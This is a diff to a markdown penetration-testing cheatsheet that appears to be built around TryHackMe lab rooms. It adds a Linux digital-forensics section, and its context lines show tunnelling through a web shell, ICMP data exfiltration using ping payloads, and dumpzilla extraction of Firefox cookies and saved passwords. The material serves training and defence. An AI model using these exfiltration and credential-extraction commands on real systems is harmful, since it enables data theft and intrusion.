@@ -17,6 +17,7 @@ When dealing with a certain challenge, you have to come up with a plan to come u
 - [Cheatsheets](#cheatsheets)
 - [Tools Top Tips](#tools-top-tips)
 - [Data Exfiltration](#data-exfiltration)
+- [Digital Forensics](#digital-forensics)
 - [Misc](#misc)
 - [Persistence](#persistence)
 
@@ -74,6 +75,8 @@ python3 neoreg.py -k thm -u http://10.10.230.138/uploader/files/tunnel.php
 
 Connect to a machine behind the webserver through the tunnel.
 
+**[curl](commands/generalcommands.md#curl)**
+
 ```console
 curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
 ```
@@ -90,7 +93,7 @@ Convert payload into hex, for example with xxd.
 echo "thm:tryhackme" | xxd -p
 ```
 
-Send a ping request with the payload.
+Send a **[ping](commands/generalcommands.md#ping)** request with the payload.
 
 ```bash
 ping <IP> -c <nr of requests> -p <payload in hex format>
@@ -154,6 +157,327 @@ Send commands to the victim machine as usual.
 ### DNS
 
 
+
+## Digital Forensics
+
+### Examining Cron Jobs
+
+Cron jobs are a common persistence mechanism on Linux. Inspect scheduled tasks to identify any suspicious or attacker-added entries.
+
+```bash
+crontab -l
+```
+List cron jobs for the current user.
+
+```bash
+cat /etc/crontab
+```
+View the system-wide crontab.
+
+```bash
+ls -la /etc/cron.*
+```
+List all cron directories (hourly, daily, weekly, monthly).
+
+```bash
+sudo ls -al /var/spool/cron/crontabs/
+```
+List which users have crontab files configured.
+
+```bash
+sudo cat /var/spool/cron/crontabs/<username>
+```
+Inspect the cron configuration for a specific user.
+
+```bash
+cat /var/spool/cron/crontabs/*
+```
+View cron jobs for all users (requires elevated privileges).
+
+### Process Analysis
+
+Inspecting running processes can reveal malicious activity such as hidden processes, suspicious parent-child relationships, or processes communicating with external hosts.
+
+**[ps](commands/generalcommands.md#ps)**
+
+```bash
+ps aux
+```
+List all running processes with detailed information.
+
+**[pstree](commands/generalcommands.md#pstree)**
+
+```bash
+pstree -aups
+```
+Display processes in a tree structure, showing parent-child relationships and command arguments.
+
+**[top](commands/generalcommands.md#top)**
+
+```bash
+top
+```
+Interactive real-time view of running processes and resource usage.
+
+**[lsof](commands/generalcommands.md#lsof)**
+
+```bash
+lsof -i
+```
+List open network connections. Add a port with `:PORT` to filter, e.g. `lsof -i :4444`.
+
+```bash
+sudo lsof -p <PID>
+```
+List all open files (including network sockets) for a specific process. Useful for investigating a suspicious PID found via `ps` or `pstree`.
+
+**[pspy64](commands/generalcommands.md#pspy64)**
+
+```bash
+./pspy64
+```
+Monitor processes and commands executed without requiring root privileges. Useful for detecting cronjobs or scripts executed by other users.
+
+### Service & Journal Analysis
+
+Services are a common persistence mechanism. Reviewing active services and their logs can reveal attacker-installed backdoors or compromised legitimate services.
+
+**[systemctl](commands/generalcommands.md#systemctl)**
+
+```bash
+sudo systemctl list-units --all --type=service
+```
+List all services including inactive and failed ones. The broad view helps uncover suspicious or oddly named services.
+
+```bash
+systemctl list-units --type=service --state=running
+```
+List only currently running services.
+
+```bash
+systemctl status <service-name>
+```
+View the status and recent log output for a specific service.
+
+```bash
+systemctl cat <service-name>
+```
+Print the full unit file for a service. Reveals hardcoded commands, persistence logic, or network activity.
+
+```bash
+cat /etc/systemd/system/<service>.service
+```
+Directly inspect the service definition file on disk.
+
+**[journalctl](commands/generalcommands.md#journalctl)**
+
+```bash
+sudo journalctl -f -u <service-name>
+```
+Follow (stream) logs for a specific service in real time. Useful for observing malicious service behavior as it happens.
+
+```bash
+journalctl -u <service-name>
+```
+View the complete historical journal log for a specific service.
+
+```bash
+journalctl --since "1 hour ago"
+```
+View all journal entries from the past hour. Useful for identifying recent suspicious activity.
+
+### Browser Forensics
+
+Browser artifacts such as history, cookies, saved credentials, and session data can be extracted for forensic analysis.
+
+#### Firefox - **[dumpzilla.py](commands/generalcommands.md#dumpzillapy)**
+
+The Firefox profile is typically located at `~/.mozilla/firefox/<profile>/`. To find the profile name, check `~/.mozilla/firefox/profiles.ini`.
+
+```bash
+sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --All
+```
+Extract all available data from the Firefox profile.
+
+```bash
+sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Bookmarks
+```
+Extract saved bookmarks. May reveal C2 infrastructure or attacker reconnaissance sites.
+
+```bash
+sudo python3 dumpzilla.py /home/<user>/.mozilla/firefox/<profile>/ --Cookies --Passwords
+```
+Extract cookies and saved passwords from the Firefox profile.
+
+🔗 https://github.com/Busindre/dumpzilla
+
+### Securing the Environment
+
+While performing live forensic analysis, it is essential to note that it is a potentially compromised host. It is therfore a good idea to ensure we are using known good binaries and libraries to conduct our information gathering and analysis. Often, this can be done by mounting a USB or drive containing binaries from a clean Debian-based installation (/bin, /sbin, /lib, and /lib64).
+
+We can modify our `PATH` and `LD_LIBRARY_PATH` (shared libraries) environment variables to use these trusted binaries:
+
+```bash
+export PATH=/mnt/usb/bin:/mnt/usb/sbin
+export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
+```
+
+### Kernel Log Analysis
+
+The kernel ring buffer and kernel log file record hardware events, driver messages, and system errors. Useful for detecting rootkit installations, unusual module loading, and hardware-level tampering.
+
+**[dmesg](commands/generalcommands.md#dmesg)**
+
+```bash
+sudo dmesg
+```
+View the current contents of the kernel ring buffer.
+
+```bash
+sudo dmesg -T | grep '<keyword>'
+```
+View ring buffer messages with human-readable timestamps, filtered by keyword. Useful for investigating suspicious module loads or kernel taints.
+
+```bash
+sudo dmesg -T | grep 'custom_kernel'
+```
+Example: detect a custom or unsigned kernel module load.
+
+```bash
+cat /var/log/kern.log
+```
+View the persistent kernel log file (managed by rsyslog/syslog). Use `less` or `tail -f` for larger files.
+
+```bash
+tail -f /var/log/kern.log
+```
+Follow the kernel log in real time.
+
+### Audit Log Analysis
+
+The Linux audit framework (`auditd`) records system calls, file access, and user activity. Rules define what gets logged; `ausearch` and `aureport` are used to query and report on those logs. Audit logs are stored in `/var/log/audit/audit.log`.
+
+#### Setting Audit Rules with **[auditctl](commands/generalcommands.md#auditctl)**
+
+Rules added via `auditctl` are temporary (cleared on reboot). For persistent rules, add them to `/etc/audit/audit.rules`.
+
+```bash
+sudo auditctl -w /etc/passwd -p wra -k users
+```
+Watch `/etc/passwd` for write, read, and attribute changes. Tags events with the key `users`.
+
+```bash
+sudo auditctl -a always,exit -F arch=b64 -S execve -k execve_syscalls
+```
+Log every program execution via the `execve` syscall on 64-bit systems. Tags events with `execve_syscalls`.
+
+#### Querying Logs with **[ausearch](commands/generalcommands.md#ausearch)**
+
+```bash
+sudo ausearch -k <key>
+```
+Search audit logs by rule key.
+
+```bash
+sudo ausearch -k users
+```
+Find all events tagged with the `users` key (e.g., `/etc/passwd` changes).
+
+```bash
+sudo ausearch -k execve_syscalls
+```
+Find all program execution events.
+
+#### Generating Reports with **[aureport](commands/generalcommands.md#aureport)**
+
+```bash
+sudo ausearch -k users | aureport -f --summary
+```
+Pipe ausearch output to aureport to generate a summary report of file-related events.
+
+```bash
+sudo ausearch -k users | aureport -f user-logs
+```
+Generate a named report from ausearch output.
+
+### System Profiling
+
+When performing live analysis on a potentially compromised host, establish a baseline by profiling the system's identity, hardware, software, and network state before proceeding with deeper investigation.
+
+**[hostnamectl](commands/generalcommands.md#hostnamectl)**
+
+```bash
+hostnamectl
+```
+Display system hostname, machine ID, operating system, kernel version, and virtualisation type.
+
+**[uptime](commands/generalcommands.md#uptime)**
+
+```bash
+uptime
+```
+Show how long the system has been running, the number of logged-in users, and load averages.
+
+**[lscpu](commands/generalcommands.md#lscpu)**
+
+```bash
+lscpu
+```
+Display detailed CPU architecture information (cores, threads, vendor, model).
+
+**[df](commands/generalcommands.md#df)**
+
+```bash
+df -h
+```
+Report disk space usage across all mounted filesystems in human-readable format.
+
+**[lsblk](commands/generalcommands.md#lsblk)**
+
+```bash
+lsblk
+```
+List block devices (disks and partitions) with sizes and mount points.
+
+**[free](commands/generalcommands.md#free)**
+
+```bash
+free -h
+```
+Show memory usage (total, used, free, cached) in human-readable format.
+
+**[dpkg](commands/generalcommands.md#dpkg)**
+
+```bash
+dpkg -l
+```
+List all installed Debian packages. Useful for identifying suspicious or unexpected software.
+
+**[apt](commands/generalcommands.md#apt)**
+
+```bash
+apt list --installed | head -n 30
+```
+List installed packages via apt. Can help spot packages that seem out of place in the server context.
+
+**[ip](commands/generalcommands.md#ip)**
+
+```bash
+ip a
+```
+Display all network interfaces and their IP addresses. Modern replacement for `ifconfig`.
+
+```bash
+ip r
+```
+Display the IP routing table. Modern replacement for `route`.
+
+**[ss](commands/generalcommands.md#ss)**
+
+```bash
+ss -tlun
+```
+Show active TCP/UDP listening sockets with process names. Modern replacement for `netstat -tlun`.
 
 ## Misc
 
